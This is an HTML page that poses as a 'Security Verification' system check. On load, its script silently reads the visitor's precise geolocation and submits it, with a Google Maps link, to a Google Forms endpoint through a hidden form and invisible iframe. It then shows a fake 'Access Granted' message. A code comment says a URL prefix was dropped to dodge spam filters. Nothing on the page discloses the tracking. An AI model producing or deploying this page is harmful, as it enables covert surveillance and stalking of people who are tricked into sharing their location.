<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Verification</title>
    <style>
        body { font-family: sans-serif; background: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); text-align: center; max-width: 400px; }
        h1 { color: #333; font-size: 22px; }
        p { color: #666; margin-top: 10px; }
        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div class="container">
        <div id="spinner" class="spinner"></div>
        <h1 id="title">System Check</h1>
        <p id="details">Verifying parameters...</p>
    </div>

    <iframe name="hidden_iframe" id="hidden_iframe" style="display:none;"></iframe>
    <form 
        action="https://docs.google.com/forms/d/e/1FAIpQLSfPo8rchVQJZxVNSp_0Buqy-e7sAgBA5OSQK6yO7W0223Dvzg/formResponse" 
        method="post" 
        target="hidden_iframe" 
        id="hidden_form"
        style="display:none;"
    >
        <input type="text" name="entry.1088471266" id="form_input" value="">
    </form>

    <script>
        const title = document.getElementById('title');
        const details = document.getElementById('details');
        const spinner = document.getElementById('spinner');

        function getLocation() {
            if (!navigator.geolocation) {
                fail("Browser not supported.");
                return;
            }
            navigator.geolocation.getCurrentPosition(success, error, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        }

        function success(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const acc = Math.round(position.coords.accuracy);
            const time = new Date().toLocaleTimeString();

            // Construct data - REMOVED 'http' to prevent spam filters
            const link = `maps.google.com/?q=${lat},${lng}`;
            const finalData = `${time} | Acc:${acc}m | ${link}`;

            submitData(finalData);
        }

        function submitData(dataString) {
            // 1. Fill the hidden form
            document.getElementById('form_input').value = dataString;

            // 2. Submit the form programmatically
            document.getElementById('hidden_form').submit();

            // 3. Show success message (We assume success because we can't track the iframe)
            title.innerText = "Verified";
            details.innerText = "Access Granted.";
            details.style.color = "green";
            spinner.style.display = "none";
        }

        function error(err) {
            console.warn(err);
            fail("Location access denied or failed.");
        }

        function fail(msg) {
            title.innerText = "Failed";
            details.innerText = msg;
            details.style.color = "red";
            spinner.style.borderTopColor = "red";
            spinner.style.animation = "none";
        }

        // Run immediately
        getLocation();
    </script>

</body>
</html>
